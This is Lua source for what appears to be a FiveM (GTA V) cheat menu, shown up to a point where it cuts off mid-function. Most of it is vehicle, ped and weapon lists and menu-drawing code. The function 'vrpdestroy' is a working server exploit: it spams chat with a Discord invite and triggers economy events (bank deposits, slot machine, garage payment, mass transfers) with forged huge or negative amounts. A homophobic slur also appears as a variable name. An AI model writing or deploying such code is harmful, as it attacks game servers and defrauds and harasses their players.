function DoesVehicleHaveExtras(vvvvvvvvvvvvvvvvvvvvvvvv)
    for i = 1, 30 do
        if DoesExtraExist(vvvvvvvvvvvvvvvvvvvvvvvv, i) then
            return waduyh487r64
        end
    end
    return KZjx
end

function checkValidVehicleMods(aC)
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, KZjx)
    local az = {}
    local aD = GetNumVehicleMods(ay, aC)
    if aC == 48 and aD == 0 then
        local aD = GetVehicleLiveryCount(ay)
        for i = 1, aD, 1 do
            local aE = i - 1
            local aF = GetLiveryName(ay, aE)
            local realModName = GetLabelText(aF)
            local aG, realSpawnName = aC, aE
            az[i] = {
                menuName = realModName,
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        end
    end
    for i = 1, aD, 1 do
        local aE = i - 1
        local aF = GetModTextLabel(ay, aC, aE)
        local realModName = GetLabelText(aF)
        local aG, realSpawnName = aD, aE
        az[i] = {
            menuName = realModName,
            data = {
                ['modid'] = aG,
                ['realIndex'] = realSpawnName
            }
        }
    end
    if aD > 0 then
        local aE = -1
        local aG, realSpawnName = aC, aE
        table.insert(
            az,
            1,
            {
                menuName = 'Stock',
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        )
    end
    return az
end

local aH = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aI = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aJ = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}

local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = WADUI
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, KZjx) then
        pedVeh = GetVehiclePedIsIn(ped, KZjx)
    else
        pedVeh = GetVehiclePedIsIn(ped, waduyh487r64)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, KZjx)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), waduyh487r64, waduyh487r64)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = WADUI
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = WADUI
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end


function vrpdestroy()
                for bD = 0, 9 do
                    udwdj(
                        '_chat:messageEntered',
                        'iSeek https://discord.gg/uDTmjF7',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'https://discord.gg/uDTmjF7'
                    )
                end
                udwdj(
                    'lscustoms:payGarage',
                    {
                        costs = -99999999
                    }
                )
                udwdj('vrp_slotmachine:server:2', 999999999)
                udwdj('Banca:deposit', 999999999)
                udwdj('bank:deposit', 999999999)
                local di = GetPlayerServerId(PlayerId())
                for i = 0, 256 do
                    TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
                end
            end
			
local aK = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aL = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aM = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aN = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aO = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aP = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aQ = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aR = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aS = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aT = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aU = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aV = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aW = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aX = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aY = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aZ = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local a_ = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b0 = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local b1 = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local b2 = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local b3 = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local b4 = {
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX,
    aY,
    aZ,
    a_,
    b0,
    b1,
    b2
}
local b5 = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}

local currentMenuX = 1
local selectedMenuX = 1
local currentMenuY = 1
local selectedMenuY = 1
local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
local menuY = { 0.1, 0.025, 0.2, 0.3, 0.425 }

local discordPresence = waduyh487r64



local SelectedPlayer
local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_R\65\73\10LGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "a_m_y_musclbeac_02", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01", "s_m_m_chemsec_01", "ig_claypain", "s_m_m_ciasec_01", "ig_chrisformage", "cs_chrisformage", "s_m_y_doorman_01", "ig_dom", "ig_dreyfuss", "mp_m_exarmy_01", "s_m_y_fireman_01", "a_m_o_genstreet_01", "a_f_y_hippie_01", "a_m_y_hippy_01", "u_m_y_imporage", "ig_hunter", "a_f_o_indian_01", "a_f_y_indian_01", "u_m_m_jesus_01", "a_m_y_jetski_01","ig_lestercrest","u_m_y_mani", "s_m_m_mariachi_01", "s_m_m_marine_01", "s_m_y_marine_01", "s_m_m_marine_02", "s_m_y_marine_02", "s_m_y_marine_03", "mp_m_marston_01", "ig_maryann", "ig_maude", "s_m_y_mime", "s_m_m_movspace_01", "ig_old_man2", "ig_omega", "hc_gunman", "ig_priest", "u_m_y_rsranger_01", "a_m_o_salton_01", "u_m_y_staggrm_01", "s_m_y_swat_01", "a_f_y_topless_01", "ig_tracydisanto", "mp_m_g_vagfun_01", "u_m_y_juggernaut_01", "mp_m_waremech_01", "s_f_y_baywatch_01", "a_f_m_beach_01", "a_f_y_beach_01", "a_m_y_beach_01" }
local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "\97\95\99\95\100\101\101\114\10", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy", "a_c_rat", "a_c_poodle", "a_c_pigeon", "a_c_crow", "a_c_cormorant", "a_c_chickenhawk", "a_c_seagull" }
local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }

local currentVehicle = 1
local selectedVehicle = 1

local currentVehicleSpeed = 16
local selectedVehicleSpeed = 16

local currentBone = 1
local selectedBone = 1

local currentDamage = 1
local selectedDamage = 1

local currentPed = 1
local selectedPed = 1
local selectedPedd = 1
local currentPedd = 1
local selectedPeddd = 1
local currentPeddd = 1
local selectedPedddd = 1
local currentPedddd = 1

local currentBullet = 1
local selectedBullet = 1

local menus = { }
local Keys = {
  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}
local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
local optionCount = 0

local currentKey = WADUI
local currentMenu = WADUI

local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

function math.round(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBou328h(frequency)
    local awd2323 = {}
    local curtime = GetGameTimer() / 1000

    awd2323.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
    awd2323.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
    awd2323.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

    return awd2323
end

local faggot123 = {
"WEAPON_KNIFE",
"WEAPON_KNUCKLE",
"WEAPON_NIGHTSTICK",
"WEAPON_HAMMER",
"WEAPON_BAT",
"WEAPON_GOLFCLUB",
"WEAPON_CROWBAR",
"WEAPON_BOTTLE",
"WEAPON_DAGGER",
"WEAPON_HATCHET",
"WEAPON_MACHETE",
"WEAPON_FLASHLIGHT",
"WEAPON_SWITCHBLADE",
"WEAPON_PISTOL",
"WEAPON_PISTOL_MK2",
"WEAPON_COMBATPISTOL",
"WEAPON_APPISTOL",
"WEAPON_PISTOL50",
"WEAPON_SNSPISTOL",
"WEAPON_HEAVYPISTOL",
"WEAPON_VINTAGEPISTOL",
"WEAPON_STUNGUN",
"WEAPON_FLAREGUN",
"WEAPON_MARKSMANPISTOL",
"WEAPON_REVOLVER",
"WEAPON_MICROSMG",
"WEAPON_SMG",
"WEAPON_SMG_MK2",
"WEAPON_ASSAULTSMG",
"WEAPON_MG",
"WEAPON_COMBATMG",
"WEAPON_COMBATMG_MK2",
"WEAPON_COMBATPDW",
"WEAPON_GUSENBERG",
"WEAPON_MACHINEPISTOL",
"WEAPON_ASSAULTRIFLE",
"WEAPON_ASSAULTRIFLE_MK2",
"WEAPON_CARBINERIFLE",
"WEAPON_CARBINERIFLE_MK2",
"WEAPON_ADVANCEDRIFLE",
"WEAPON_SPECIALCARBINE",
"WEAPON_BULLPUPRIFLE",
"WEAPON_COMPACTRIFLE",
"WEAPON_PUMPSHOTGUN",
"WEAPON_SAWNOFFSHOTGUN",
"WEAPON_BULLPUPSHOTGUN",
"WEAPON_ASSAULTSHOTGUN",
"WEAPON_MUSKET",
"WEAPON_HEAVYSHOTGUN",
"WEAPON_DBSHOTGUN",
"WEAPON_SNIPERRIFLE",
"WEAPON_HEAVYSNIPER",
"WEAPON_HEAVYSNIPER_MK2",
"WEAPON_MARKSMANRIFLE",
"WEAPON_GRENADELAUNCHER",
"WEAPON_GRENADELAUNCHER_SMOKE",
"WEAPON_RPG",
"WEAPON_STINGER",
"WEAPON_FIREWORK",
"WEAPON_HOMINGLAUNCHER",
"WEAPON_GRENADE",
"WEAPON_STICKYBOMB",
"WEAPON_PROXMINE",
"WEAPON_BZGAS",
"WEAPON_SMOKEGRENADE",
"WEAPON_MOLOTOV",
"WEAPON_FIREEXTINGUISHER",
"WEAPON_PETROLCAN",
"WEAPON_SNOWBALL",
"WEAPON_FLARE",
"WEAPON_BALL",
"WEAPON_MINIGUN"
}

local function debugPrint(text)
    if Plane.debug then
        Citizen.Trace("[Plane] "..tostring(text))
    end
end


local function setMenuProperty(id, property, value)
    if id and menus[id] then
        menus[id][property] = value
        debugPrint(id.." menu property changed: { "..tostring(property)..", "..tostring(value).." }")
    end
end

    function Plane.SetSpriteColor(id, r, g, b, a)
        setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
    end

local function isMenuVisible(id)
    if id and menus[id] then
        return menus[id].visible
    else
        return KZjx
    end
end

if GetVehiclePedIsUsing(PlayerPedId()) then
    vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(PlayerPedId())
end

local bv = KZjx

local bx = GetPlayerServerId(PlayerPedId(-1))
local by = GetPlayerName(bx)

local bl = {
    {
        name = "~h~Spoilers",
        id = 0
    },
    {
        name = "~h~Front Bumper",
        id = 1
    },
    {
        name = "~h~Rear Bumper",
        id = 2
    },
    {
        name = "~h~Side Skirt",
        id = 3
    },
    {
        name = "~h~Exhaust",
        id = 4
    },
    {
        name = "~h~Frame",
        id = 5
    },
    {
        name = "~h~Grille",
        id = 6
    },
    {
        name = "~h~Hood",
        id = 7
    },
    {
        name = "~h~Fender",
        id = 8
    },
    {
        name = "~h~Right Fender",
        id = 9
    },
    {
        name = "~h~Roof",
        id = 10
    },
    {
        name = "~h~Vanity Plates",
        id = 25
    },
    {
        name = "~h~Trim",
        id = 27
    },
    {
        name = "~h~Ornaments",
        id = 28
    },
    {
        name = "~h~Dashboard",
        id = 29
    },
    {
        name = "~h~Dial",
        id = 30
    },
    {
        name = "~h~Door Speaker",
        id = 31
    },
    {
        name = "~h~Seats",
        id = 32
    },
    {
        name = "~h~Steering Wheel",
        id = 33
    },
    {
        name = "~h~Shifter Leavers",
        id = 34
    },
    {
        name = "~h~Plaques",
        id = 35
    },
    {
        name = "~h~Speakers",
        id = 36
    },
    {
        name = "~h~Trunk",
        id = 37
    },
    {
        name = "~h~Hydraulics",
        id = 38
    },
    {
        name = "~h~Engine Block",
        id = 39
    },
    {
        name = "~h~Air Filter",
        id = 40
    },
    {
        name = "~h~Struts",
        id = 41
    },
    {
        name = "~h~Arch Cover",
        id = 42
    },
    {
        name = "~h~Aerials",
        id = 43
    },
    {
        name = "~h~Trim 2",
        id = 44
    },
    {
        name = "~h~Tank",
        id = 45
    },
    {
        name = "~h~Windows",
        id = 46
    },
    {
        name = "~h~Livery",
        id = 48
    },
    {
        name = "~h~Horns",
        id = 14
    },
    {
        name = "~h~Wheels",
        id = 23
    },
    {
        name = "~h~Wheel Types",
        id = "wheeltypes"
    },
    {
        name = "~h~Extras",
        id = "extra"
    },
    {
        name = "~h~Neons",
        id = "neon"
    },
    {
        name = "~h~Paint",
        id = "paint"
    },
    {
        name = "~h~Headlights Color",
        id = "headlight"
    },
    {
        name = "~h~Licence Plate",
        id = "licence"
    }
}


local function setMenuVisible(id, visible, holdCurrent)
    if id and menus[id] then
        setMenuProperty(id, "visible", visible)

        if not holdCurrent and menus[id] then
            setMenuProperty(id, "currentOption", 1)
        end

        if visible then
            if id ~= currentMenu and isMenuVisible(currentMenu) then
                setMenuVisible(currentMenu, KZjx)
            end

            currentMenu = id
        end
    end
end


local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
    SetTextColour(color.r, color.g, color.b, color.a)
    SetTextFont(font)
    SetTextScale(scale, scale)

    if shadow then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end

    if menus[currentMenu] then
        if center then
            SetTextCentre(center)
        elseif alignRight then
            SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
            SetTextRightJustify(waduyh487r64)
        end
    end

    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x, y)
end


local function drawRect(x, y, width, height, color)
    DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end


local function drawTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight / 2

        if menus[currentMenu].titleBackgroundSprite then
            DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
        else
            drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
        end

        drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, waduyh487r64)
    end
end


local function drawSubTitle()
    if menus[currentMenu] then
        local x = menus[currentMenu].x + menus[currentMenu].width / 2
        local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

        local subTitleColor = { r = 255, g = 255, b = 255, a = 0 }

        drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, KZjx)

        if optionCount > menus[currentMenu].maxOptionCount then
